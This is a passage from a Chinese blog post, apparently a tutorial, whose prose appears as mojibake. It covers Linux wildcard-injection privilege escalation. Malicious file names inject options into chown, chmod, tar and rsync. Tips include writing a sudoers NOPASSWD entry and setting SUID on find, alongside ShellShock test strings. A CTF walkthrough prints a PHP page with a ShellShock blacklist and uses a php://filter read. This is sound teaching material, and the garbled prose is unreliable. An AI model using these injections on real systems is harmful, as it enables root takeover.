</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>execve<span class=o>(</span><span class=s2>&#34;/bin/chown&#34;</span>, <span class=o>[</span><span class=s2>&#34;chown&#34;</span>, <span class=s2>&#34;-R&#34;</span>, <span class=s2>&#34;zedd:zedd&#34;</span>, <span class=s2>&#34;config.php&#34;</span>, <span class=s2>&#34;index.php&#34;</span>, <span class=s2>&#34;--reference=.backdoor.php&#34;</span><span class=o>]</span>, 0x7ffe5b43b1e8 /* <span class=m>35</span> vars */<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>è·Ÿæˆ‘ä»¬ä¸Šä¸ªä¾‹å­åŸç†å…¶å®ä¸€æ ·ï¼Œ<code>--reference=.backdoor.php</code>è¢«ä½œä¸ºä¸€ä¸ªé€‰é¡¹è¿›è¡Œäº†å¤„ç†ï¼Œè€Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>--reference=RFILE  use RFILE&#39;s owner and group rather than
</span></span><span class=line><span class=cl>                         specifying OWNER:GROUP values
</span></span></code></pre></td></tr></table></div></div><p><code>--reference=RFILE</code>è¿™ä¸ªé€‰é¡¹åˆ™æ˜¯ä½¿ç”¨<code>RFILE</code>çš„æ–‡ä»¶æ‹¥æœ‰è€…å’Œç”¨æˆ·ç»„æ¥æ”¹å˜æ–‡ä»¶å±æ€§ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¼ å…¥çš„<code>OWNER:GROUP</code>å‚æ•°ã€‚</p><p>å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>chown</code>çš„<code>--reference</code>é€‰é¡¹å°†è¦†ç›–æŒ‡å®šä¸º<code>root</code>ç”¨æˆ·è¾“å…¥çš„å‚æ•°<code>zedd:zedd</code>ï¼ŒæŠŠæ­¤ç›®å½•ä¸­æ‰€æœ‰<code>.php</code>æ–‡ä»¶çš„æ‰€æœ‰è€…æ”¹å˜ä¸<code>.backdoor.php</code>çš„æ‰€æœ‰è€…<code>test</code>ã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610003986.jpg loading=lazy></p><p>æ‰€ä»¥ï¼ŒæŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒ<code>root</code>å°†æ–‡ä»¶çš„æ‰€æœ‰æƒæ›´æ”¹ä¸ºä»»æ„ç”¨æˆ·ï¼Œå¹¶â€œåŠ«æŒâ€æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚</p><h4 id=chmod-file-reference>Chmod File Reference</h4><p>ç±»ä¼¼<code>chown</code>çš„è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤<code>chmod</code>ï¼Œå®ƒä¹Ÿæœ‰<code>--reference=RFIE</code>çš„é€‰é¡¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--reference<span class=o>=</span>RFILE  use RFILE<span class=err>&#39;</span>s mode instead of MODE values
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610000066.jpg loading=lazy></p><p>ä¸<code>chown</code>ç±»ä¼¼ï¼Œå› ä¸ºæœ‰<code>--reference=.backdoor.php</code>çš„å­˜åœ¨ï¼Œåœ¨ä½¿ç”¨<code>chmod 000 *</code>çš„æ—¶å€™ä¹Ÿä¼šæŠŠåŠ«æŒåˆ°ä¸<code>.backdoor.php</code>æ–‡ä»¶æƒé™ä¸€æ ·çš„æƒé™</p><h4 id=tarå‘½ä»¤åˆ©ç”¨>Tarå‘½ä»¤åˆ©ç”¨</h4><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹<code>tar</code>å‘½ä»¤å¸®åŠ©æ–‡æ¡£ä¸­çš„å‡ ä¸ªæœ‰æ„æ€çš„é€‰é¡¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--checkpoint<span class=o>[=</span>NUMBER<span class=o>]</span>  
</span></span><span class=line><span class=cl>	display progress messages every NUMBERth record <span class=o>(</span>default 10<span class=o>)</span>
</span></span><span class=line><span class=cl>--checkpoint-action<span class=o>=</span>ACTION   
</span></span><span class=line><span class=cl>	execute ACTION on each checkpoint
</span></span></code></pre></td></tr></table></div></div><p>ä»å¸®åŠ©æ–‡æ¡£ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥ä»ä¸­ç†è§£åˆ°ï¼Œ<code>--checkpoint=1</code>å¯ä»¥ç”¨æ¥æ˜¾ç¤ºä¿¡æ¯ï¼Œ<code>--checkpoint-action=exec=sh shell.sh</code>å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤</p><p>å…ˆå°è¯•æ„å»ºä¸€ä¸ª<code>shell.sh</code>è„šæœ¬ï¼Œå†…å®¹ä¸º<code>/usr/bin/id</code>ï¼Œä»¥åŠæ–‡ä»¶åä¸º<code>--checkpoint=1</code>ä¸<code>--checkpoint-action=exec=sh shell.sh</code>çš„æ–‡ä»¶ï¼Œä½¿ç”¨<code>tar -cf test.tar *</code>æŠŠå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å‹ç¼©åˆ°<code>test.tar</code>å‹ç¼©åŒ…å†…</p><p><img src=https://blogpic.zdy.one/img/20190610008945.jpg loading=lazy></p><p>å¯è§ï¼Œ<code>/usr/bin/id</code>å·²ç»è¢«æˆåŠŸæ‰§è¡Œè¾“å‡ºã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610007928.jpg loading=lazy></p><p>ä¸ä¹‹å‰ä¸€æ ·ï¼Œ<code>--checkpoint=1</code>ä¸<code>--checkpoint-action=exec=sh shell.sh</code>è¢«ä½œä¸ºé€‰é¡¹å¤„ç†</p><p><img src=https://blogpic.zdy.one/img/20190610007550.jpg loading=lazy></p><p>åœ¨ 2018 SWPUCTF ä¸Šæœ‰ä¸€é“ web é¢˜è€ƒç‚¹ä¹Ÿæ­£æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‚¹ï¼Œç”±äºé¢˜ç›®å®˜æ–¹æ²¡æœ‰å¼€æºï¼Œè¿™é‡Œç»™ä¸€ä¸ªæ¯”è¾ƒè¯¦ç»†çš„ @ä¸€å¶é£˜é›¶ å¸ˆå‚…å†™çš„ wp ç”¨äºå‚è€ƒå­¦ä¹ : <a class=link href=https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98 target=_blank rel=noopener>2018SWPUCTF-Web#ä¿¡æ¯å†æ¬¡å‘æ˜</a></p><h4 id=rsyncå‘½ä»¤åˆ©ç”¨>rsyncå‘½ä»¤åˆ©ç”¨</h4><p><code>rsync</code>å‘½ä»¤å¯èƒ½æ¯”è¾ƒå°‘ç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹</p><blockquote><p>NAME</p><p>â€‹ rsync - a fast, versatile, remote (and local) file-copying tool</p></blockquote><p><code>rsync</code>å‘½ä»¤æ˜¯ä¸€ä¸ªè¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯é€šè¿‡LAN/WANå¿«é€ŸåŒæ­¥å¤šå°ä¸»æœºé—´çš„æ–‡ä»¶ã€‚ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚<a class=link href=http://man.linuxde.net/rsh target=_blank rel=noopener>rsh</a>ã€<a class=link href=http://man.linuxde.net/ssh target=_blank rel=noopener>ssh</a>)æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚å¦‚ï¼š<code>rsync -t *.c foo:src</code>ï¼Œå¤åˆ¶å½“å‰æœ¬åœ°æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰çš„<code>.c</code>æ–‡ä»¶åˆ° foo è¿œç¨‹æœåŠ¡å™¨çš„<code>/src</code>æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p><code>rsync</code>å¸®åŠ©æ–‡æ¡£å«æœ‰ä»¥ä¸‹å‡ ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é€‰é¡¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-e, --rsh<span class=o>=</span>COMMAND           specify the remote shell to use
</span></span><span class=line><span class=cl>    --rsync-path<span class=o>=</span>PROGRAM    specify the rsync to run on remote machine
</span></span></code></pre></td></tr></table></div></div><p><code>--rsh=COMMAND</code>åˆæ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º<code>-e sh shell.c</code>çš„æ–‡ä»¶ï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ª<code>shell.c</code>æ–‡ä»¶ï¼Œæ±¡æŸ“<code>rsync</code>å‚æ•°æ¥å®ç°æ‰§è¡Œæˆ‘ä»¬åœ¨<code>shell.c</code>ä¸­å†™å…¥çš„é¢„æœŸå‘½ä»¤</p><p>å‡è®¾å½“å‰ç›®å½•ä¸‹æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªåªæœ‰<code>root</code>ç”¨æˆ·å¯è¯»çš„<code>rootfile</code>æ–‡ä»¶ï¼Œç”±äºä¸èƒ½ç›´æ¥è¾“å‡ºç»“æœï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ <code>cat ./rootfile > ./output</code>ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610004148.jpg loading=lazy></p><p>å¾—åˆ°çš„<code>output</code>æ–‡ä»¶æ˜¯ 644 çš„æƒé™ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸæ„é€ äº†ä¸€ä¸ªææƒè¯»å–çš„æ–‡ä»¶çš„ payload ï¼Œè¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªèƒ½æå–åˆ°æ‰§è¡Œ<code>rsync</code>ç”¨æˆ·çš„æƒé™ï¼Œä¸æ˜¯ç›´æ¥çš„<code>root</code>æƒé™ï¼Œè¿™é‡Œå› ä¸ºæ‰§è¡Œå‘½ä»¤çš„æ˜¯<code>root</code>æƒé™ï¼Œæ‰€ä»¥èƒ½è¯»å–åªæœ‰<code>root</code>ç”¨æˆ·æ‰èƒ½è¯»å–çš„<code>rootfile</code>æ–‡ä»¶</p><h4 id=tips>Tips</h4><ul><li><p>æ—¢ç„¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‚ç…§ä¸Šç¯‡åˆ—ä¸¾çš„åå¼¹ shell çš„æ–¹å¼å°† shell åå¼¹ç»™æˆ‘ä»¬ï¼Œä¹Ÿå¯ä»¥é…åˆ<code>msfvenom</code>æ¥ä½¿ç”¨ã€‚</p></li><li><p><code>tar</code>å‘½ä»¤æ¯”è¾ƒå¤šçš„éƒ½ç”¨åœ¨<code>/etc/crontab</code>è®¡åˆ’ä»»åŠ¡ä¸­ï¼Œç»å¸¸ä¼šæœ‰ç®¡ç†å‘˜ä¼šç”¨<code>crontab</code>æ¥æ‰§è¡Œä¸€äº›<code>tar</code>å‘½ä»¤çš„å¤‡ä»½æ“ä½œï¼Œè€Œä¸”<code>crontab</code>æ‰§è¡Œçš„æƒé™è¿˜æ˜¯<code>root</code>æƒé™ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸ªå¾ˆå¥½åˆ©ç”¨çš„ç‚¹</p></li><li><p><code>tar</code>å‘½ä»¤éœ€è¦è¿›å…¥åˆ°<code>--checkpoint=1</code>æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å†…ï¼Œå¦‚æœåŠ ä¸Šç»å¯¹è·¯å¾„å°†ä¼šå¤±æ•ˆï¼Œä¾‹å¦‚<code>tar cf test.tar /var/www/html/*</code></p><p><img src=https://blogpic.zdy.one/img/20190610005324.jpg loading=lazy></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° shell å¤„ç†æ–¹å¼å°†<code>/home/zedd/Desktop/test</code>ä¸ç›®å½•ä¸‹çš„æ–‡ä»¶åé€ä¸ªæ‹¼æ¥èµ·æ¥ï¼Œå°±è¾¾ä¸åˆ°æ±¡æŸ“å‚æ•°çš„æ•ˆæœäº†</p></li><li><p>è¿˜å¯ä»¥ç”¨<code>echo "zedd ALL=(root) NOPASSWD: ALL" > /etc/sudoers</code>ï¼ŒæŠŠè‡ªå·±ç›´æ¥å†™å…¥ç®¡ç†å‘˜ç»„</p></li><li><p>åˆ©ç”¨<code>chmod u+s /usr/bin/find</code>æå‡ä¸º<code>root</code>æƒé™æ‰§è¡Œï¼Œé…åˆ<code>find</code>å‘½ä»¤çš„<code>-exec COMMAND</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚<code>find f1 -exec "whoami" \;</code></p><p><img src=https://blogpic.zdy.one/img/20190610009998.jpg loading=lazy></p></li></ul><p>æ–‡ç« ä¸­è®¨è®ºçš„æŠ€æœ¯å¯ä»¥ä»¥ä¸åŒçš„å½¢å¼åœ¨å„ç§æµè¡Œçš„Unixå·¥å…·ä¸Šåº”ç”¨ï¼Œè¿™é‡Œä»…ä»…æ˜¯æŠ›ç –å¼•ç‰ï¼Œåˆ—ä¸¾ä¸€éƒ¨åˆ†å‘½ä»¤ã€‚ åœ¨å®é™…æ”»å‡»ä¸­ï¼Œä»»æ„ shell é€‰é¡¹/å‚æ•°éƒ½å¯ä»¥éšè—åœ¨å¸¸è§„æ–‡ä»¶ä¸­ï¼Œç®¡ç†å‘˜ä¹Ÿä¸å®¹æ˜“å‘ç°ï¼Œæ¯”å¦‚ä½¿ç”¨<code>.backdoor.php</code>ç­‰å½¢å¼ã€‚</p><h3 id=other>Other</h3><p>è¿™é‡Œè®²è®²å‡ ä¸ªè™½ç„¶ä¸å±äºææƒï¼Œä½†æ˜¯ä¹Ÿæ¯”è¾ƒæœ‰æ„æ€çš„å‡ ä¸ªç‚¹ã€‚</p><h4 id=echo>Echo</h4><p><code>echo *</code>å¯ä»¥ç”¨æ¥æ˜¾ç¤ºç›®å½•ï¼Œ<code>echo /???g</code>å¯ä»¥ç”¨æ¥æ¢æµ‹æ–‡ä»¶</p><p><img src=https://blogpic.zdy.one/img/20190610008270.jpg loading=lazy></p><h4 id=ln>ln</h4><blockquote><p>NAME</p><p>â€‹ ln - make links between files</p></blockquote><p><code>ln</code>å‘½ä»¤å¸¸å¸¸ç”¨äºé“¾æ¥ä¸¤ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”åˆ†ä¸¤ç§é“¾æ¥æ¨¡å¼ï¼Œä¸€ç§ç¡¬é“¾æ¥ä¸€ç§è½¯é“¾æ¥ï¼Œè¯¦ç»†å¯ä»¥å‚è€ƒ<a class=link href=https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html target=_blank rel=noopener>ç†è§£Linuxç¡¬é“¾æ¥ä¸è½¯é“¾æ¥</a>ã€‚è¿™é‡Œä¸»è¦è®²è®²è½¯é“¾æ¥ï¼Œè½¯é“¾æ¥ç›¸å½“äºæˆ‘ä»¬ Windows ä¸­çš„å¿«æ·æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>ln -s</code>åˆ›å»º</p><p>ä¾‹å¦‚ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä¸º<code>flag{xxx}</code>çš„åä¸º<code>flag</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>ln -s /flag file</code>ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>file</code>æ–‡ä»¶é“¾æ¥åˆ°<code>/flag</code>ï¼Œä½¿ç”¨<code>cat file</code>ä¸<code>php -r "echo file_get_contents('file')" </code>å‡å¯ä»¥è¯»å–åˆ°<code>/flag</code>çš„å†…å®¹ã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610005445.jpg loading=lazy></p><p>è¿™ä¸ªè½¯é“¾æ¥è¯»å–æ–‡ä»¶å†…å®¹å·²ç»è¢«å¤šæ¬¡åˆ©ç”¨</p><ul><li>åœ¨ GitLab CVE-2016-9086 ä¹Ÿæ˜¯åˆ©ç”¨äº†è¿™ç‚¹ï¼Œå‚è€ƒ<a class=link href=https://paper.seebug.org/104/ target=_blank rel=noopener>GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´</a></li><li>CTF ä¸­ä¹Ÿå‡ºç°äº†ç±»ä¼¼çš„é¢˜ç›®ï¼Œå‚è€ƒ<a class=link href=https://xz.aliyun.com/t/2589 target=_blank rel=noopener>ä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å–</a>ï¼Œä»¥åŠåœ¨ 2018 å¹´èµ›åšåœ°çƒæ¯ä¸Šæœ‰ä¸€é“é¢˜ä¹Ÿæ˜¯åˆ©ç”¨è¿™ä¸ªç‚¹ï¼Œå‚è€ƒ<a class=link href=https://cl0und.github.io/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/ target=_blank rel=noopener>è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•</a>ï¼Œ<a class=link href="https://www.xctf.org.cn/library/details/cyberearth-writeup/?from=groupmessage&amp;isappinstalled=0" target=_blank rel=noopener>â€œèµ›åšåœ°çƒæ¯â€å·¥ä¸šäº’è”ç½‘å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›Writeup</a></li></ul><h4 id=shellshockcve-2014-6271>ShellShock(CVE-2014-6271)</h4><p>Bash 4.3ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬åœ¨å¤„ç†æŸäº›æ„é€ çš„ç¯å¢ƒå˜é‡æ—¶å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå‘ç¯å¢ƒå˜é‡å€¼å†…çš„å‡½æ•°å®šä¹‰åæ·»åŠ å¤šä½™çš„å­—ç¬¦ä¸²ä¼šè§¦å‘æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ”¹å˜æˆ–ç»•è¿‡ç¯å¢ƒé™åˆ¶ï¼Œä»¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿï¼Œè¯¦ç»†åˆ†æå‚è€ƒ<a class=link href=https://www.freebuf.com/articles/system/45390.html target=_blank rel=noopener>ç ´å£³ï¼ˆShellShockï¼‰æ¼æ´æ ·æœ¬åˆ†ææŠ¥å‘Š</a></p><blockquote><ul><li><p>CVE-2014-6271 æµ‹è¯•æ–¹å¼:</p><p>env x=&rsquo;() { :;}; echo vulnerable&rsquo; bash -c &ldquo;echo this is a test&rdquo;</p></li><li><p>CVE-2014-7169 æµ‹è¯•æ–¹å¼:(CVE-2014-6271è¡¥ä¸æ›´æ–°åä»ç„¶å¯ä»¥ç»•è¿‡)
env -i X=&rsquo;;() { (a)=>' bash -c &rsquo;echo date&rsquo;; cat echo</p></li></ul></blockquote><h4 id=ä»ä¸€é“é¢˜çœ‹shell-shock>ä»ä¸€é“é¢˜çœ‹Shell Shock</h4><p>é¢˜ç›®åœ°å€ï¼š<a class=link href=https://command-executor.hackme.inndy.tw/index.php target=_blank rel=noopener>command-executor</a>â€”â€”æ¥æºäº <a class=link href=https://hackme.inndy.tw target=_blank rel=noopener>HackMe</a></p><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>â€‹ Here&rsquo;s my useless developer assistant website, try to execute your own command!</p></blockquote><p>é¢˜ç›®å¤§ä½“æ€è·¯æ˜¯ï¼š</p><ul><li>è¯»å–æºç </li><li>Shell Shockå‘½ä»¤æ‰§è¡Œ</li><li>é‡å®šå‘è¯»å†™æ–‡ä»¶</li></ul><p>é¢˜ç›®è®¾ç½®ä¸ºå‡ ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ª<code>man</code>å‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£</p><p><img src=https://blogpic.zdy.one/img/20190610000217.jpg loading=lazy></p><p>é€‰æ‹©äº†<code>ls</code>ï¼Œå¤šäº†ä¸ªè¯·æ±‚å‚æ•°<code>file=ls</code></p><p><img src=https://blogpic.zdy.one/img/20190610009784.jpg loading=lazy></p><p>å°è¯•ç”¨å…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚<code>find</code></p><p><img src=https://blogpic.zdy.one/img/20190610003424.jpg loading=lazy></p><p>çŒœæµ‹<code>eval("man /bin/" + command)</code>æˆ–è€…ä¸€äº›å…¶ä»–çš„ç›®å½•</p><p><code>Tar Tester</code>ç•Œé¢å¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ä½†æ˜¯å¹¶æ²¡æœ‰è§£å‹ï¼Œåªæ˜¯<code>tar -tvf test.tar</code>æŸ¥çœ‹å‹ç¼©åŒ…å†…çš„å†…å®¹</p><p><img src=https://blogpic.zdy.one/img/20190610006647.jpg loading=lazy></p><p><code>Cmd Exec</code>ç•Œé¢åªæœ‰ä¸¤ä¸ªå‘½ä»¤ï¼Œä¸€ä¸ª<code>ls</code>ï¼Œä¸€ä¸ª<code>env</code></p><p><img src=https://blogpic.zdy.one/img/20190610000773.jpg loading=lazy></p><p><code>List files</code>æ˜¯ä¸ªç›®å½•åˆ—ä¸¾ç•Œé¢ï¼Œå¯ä»¥åˆ—ä¸¾å‡ ä¸ªç›®å½•</p><p><img src=https://blogpic.zdy.one/img/20190610008062.jpg loading=lazy></p><p>è§‚å¯Ÿé¢˜ç›®ï¼Œé¢˜ç›® url<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>ç­‰å‡å¸¦æœ‰<code>func=xxx</code>å‚æ•°æ¥å±•ç¤ºé¡µé¢ï¼ŒçŒœæµ‹ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•ä½¿ç”¨<code>func=php://filter/read=convert.base64-encode/resource=index</code>è¯»å–æ–‡ä»¶å†…å®¹ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾</p><p><img src=https://blogpic.zdy.one/img/20190610000836.jpg loading=lazy></p><p>è§£ç å¾—åˆ° <code>index.php</code>æºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$pages = [
</span></span><span class=line><span class=cl>    [&#39;man&#39;, &#39;Man&#39;],
</span></span><span class=line><span class=cl>    [&#39;untar&#39;, &#39;Tar Tester&#39;],
</span></span><span class=line><span class=cl>    [&#39;cmd&#39;, &#39;Cmd Exec&#39;],
</span></span><span class=line><span class=cl>    [&#39;ls&#39;, &#39;List files&#39;],
</span></span><span class=line><span class=cl>];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function fuck($msg) {
</span></span><span class=line><span class=cl>    header(&#39;Content-Type: text/plain&#39;);
</span></span><span class=line><span class=cl>    echo $msg;
</span></span><span class=line><span class=cl>    exit;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$black_list = [
</span></span><span class=line><span class=cl>    &#39;\/flag&#39;, &#39;\(\)\s*\{\s*:;\s*\};&#39;
</span></span><span class=line><span class=cl>];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function waf($a) {
</span></span><span class=line><span class=cl>    global $black_list;
</span></span><span class=line><span class=cl>    if(is_array($a)) {
</span></span><span class=line><span class=cl>        foreach($a as $key =&gt; $val) {
</span></span><span class=line><span class=cl>            waf($key);
</span></span><span class=line><span class=cl>            waf($val);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        foreach($black_list as $b) {
</span></span><span class=line><span class=cl>            if(preg_match(&#34;/$b/&#34;, $a) === 1) {
</span></span><span class=line><span class=cl>                fuck(&#34;$b detected! exit now.&#34;);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>waf($_SERVER);
</span></span><span class=line><span class=cl>waf($_GET);
</span></span><span class=line><span class=cl>waf($_POST);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function execute($cmd, $shell=&#39;bash&#39;) {
</span></span><span class=line><span class=cl>    system(sprintf(&#39;%s -c %s&#39;, $shell, escapeshellarg($cmd)));
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_SERVER as $key =&gt; $val) {
</span></span><span class=line><span class=cl>    if(substr($key, 0, 5) === &#39;HTTP_&#39;) {
</span></span><span class=line><span class=cl>        putenv(&#34;$key=$val&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$page = &#39;&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;func&#39;])) {
</span></span><span class=line><span class=cl>    $page = $_GET[&#39;func&#39;];
</span></span><span class=line><span class=cl>    if(strstr($page, &#39;..&#39;) !== false) {
</span></span><span class=line><span class=cl>        $page = &#39;&#39;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($page &amp;&amp; strlen($page) &gt; 0) {
</span></span><span class=line><span class=cl>    try {
</span></span><span class=line><span class=cl>        include(&#34;$page.php&#34;);
</span></span><span class=line><span class=cl>    } catch (Exception $e) {
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function render_default() { ?&gt;
</span></span><span class=line><span class=cl>&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;
